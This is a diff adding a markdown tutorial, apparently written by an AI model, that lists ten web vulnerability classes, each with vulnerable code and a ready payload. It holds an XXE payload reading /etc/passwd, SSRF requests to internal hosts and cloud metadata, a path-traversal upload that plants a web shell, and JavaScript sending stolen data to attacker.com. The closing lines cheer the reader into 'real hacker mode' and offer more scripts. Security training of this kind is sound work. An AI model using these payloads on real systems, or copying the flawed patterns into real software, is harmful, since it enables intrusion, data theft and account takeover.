@@ -286,4 +286,210 @@ I can give:
 - Scripts to **automate detection**
 - A full **checklist** for manual testing
 
-Just let me know what you're working on 💻💣
+You got it! Let’s go **deeper** into web app vulnerability examples — covering some **intermediate to advanced techniques**. These examples will include the vulnerable logic, **realistic payloads**, and the **impact** of exploitation.
+
+---
+
+## 🔥 11. **Server-Side Request Forgery (SSRF)**
+
+### 🧪 Vulnerable Code (PHP)
+```php
+$img_url = $_GET['url'];
+$image = file_get_contents($img_url);
+```
+
+### 🚨 Exploit
+```http
+GET /load?url=http://127.0.0.1:8000/admin
+```
+
+**What happens:** The server requests internal services. This can:
+- Scan internal networks
+- Access cloud metadata (`http://169.254.169.254/`)
+- Bypass firewall restrictions
+
+---
+
+## 🔥 12. **Broken Access Control**
+
+### 🧪 Admin Panel Unprotected
+```http
+GET /admin/deleteUser?uid=42
+```
+
+No auth check, but only admins should access this.
+
+### 🚨 Exploit
+User manually navigates to that endpoint → deletes other users.
+
+---
+
+## 🔥 13. **XML External Entity Injection (XXE)**
+
+### 🧪 Vulnerable XML Parser
+```php
+libxml_disable_entity_loader(false);
+$xml = simplexml_load_string($_POST['xml']);
+```
+
+### 🚨 Exploit Payload
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+```
+
+**What happens:** The app loads system files like `/etc/passwd` into the response.
+
+---
+
+## 🔥 14. **Mass Assignment**
+
+### 🧪 Vulnerable Logic (Node.js / Express + Mongoose)
+```javascript
+User.updateOne({ _id: req.user.id }, req.body);
+```
+
+### 🚨 Exploit
+```json
+{
+  "isAdmin": true
+}
+```
+
+**What happens:** Attacker updates their account and escalates to admin.
+
+---
+
+## 🔥 15. **HTTP Host Header Attack**
+
+### 🧪 Vulnerable Redirect Logic
+```php
+$redirect = "http://" . $_SERVER['HTTP_HOST'] . "/login";
+```
+
+### 🚨 Exploit
+```http
+Host: evil.com
+```
+
+**What happens:** Redirects users to an attacker-controlled domain → phishing or session hijack.
+
+---
+
+## 🔥 16. **Path Traversal in File Upload**
+
+### 🧪 Vulnerable Upload Code
+```php
+$filename = $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $filename);
+```
+
+### 🚨 Exploit
+Filename: `../../../../var/www/html/shell.php`
+
+**What happens:** Places a **web shell** in a public directory:
+```http
+http://target.com/shell.php?cmd=id
+```
+
+---
+
+## 🔥 17. **Open CORS (Cross-Origin Resource Sharing)**
+
+### 🧪 Misconfigured Server
+```http
+Access-Control-Allow-Origin: *
+```
+
+### 🚨 Exploit
+- Attacker’s JS on another domain can make authenticated requests.
+- Example:
+```javascript
+fetch("https://target.com/api/user", {credentials: 'include'})
+  .then(res => res.text())
+  .then(data => fetch("https://attacker.com/steal?data=" + data));
+```
+
+---
+
+## 🔥 18. **Clickjacking**
+
+### 🧪 No `X-Frame-Options` Header
+
+### 🚨 Exploit
+Attacker embeds target in iframe:
+```html
+<iframe src="https://target.com/transfer" style="opacity:0;position:absolute;"></iframe>
+```
+
+**What happens:** User clicks on invisible button (like “Transfer Money”) without realizing it.
+
+---
+
+## 🔥 19. **JWT Forgery (None Algorithm)**
+
+### 🧪 Vulnerable Backend (misconfigured JWT parser)
+- Accepts token with `alg: none` (no signature check)
+
+### 🚨 Exploit
+Craft JWT:
+```json
+{
+  "alg": "none",
+  "typ": "JWT"
+}.
+{
+  "user": "admin"
+}
+```
+
+**What happens:** No signature → Attacker is admin.
+
+---
+
+## 🔥 20. **Race Conditions**
+
+### 🧪 Vulnerable Logic
+```python
+if user.balance >= amount:
+    user.balance -= amount
+    recipient.balance += amount
+```
+
+### 🚨 Exploit
+- Attacker sends **multiple simultaneous requests** to transfer money.
+- Balance is checked but **not locked** between requests.
+
+**What happens:** User's account goes into negative or duplicates funds.
+
+---
+
+### 🛠️ Testing Tools for These
+
+| Tool | Use |
+|------|-----|
+| Burp Suite | Manual and automated testing |
+| OWASP ZAP | Free web scanner |
+| ffuf / dirsearch | Content discovery |
+| sqlmap | SQLi automation |
+| wfuzz | Fuzzing |
+| nuclei | Template-based vuln scanner |
+| XSStrike | Advanced XSS scanner |
+| SSRFmap | SSRF automation |
+| JWT.io / jwt_tool | JWT tampering |
+| Nikto | General web server scanning |
+
+---
+
+Let me know if you want a:
+- Checklist for **bug bounty hunting**
+- Ready-made **Burp Suite payload list**
+- Script for scanning specific vulnerabilities
+- Setup for a **testing lab** (like DVWA or WebGoat)
+
+You’re getting into some real hacker mode now 💻💣 Want to go deeper?
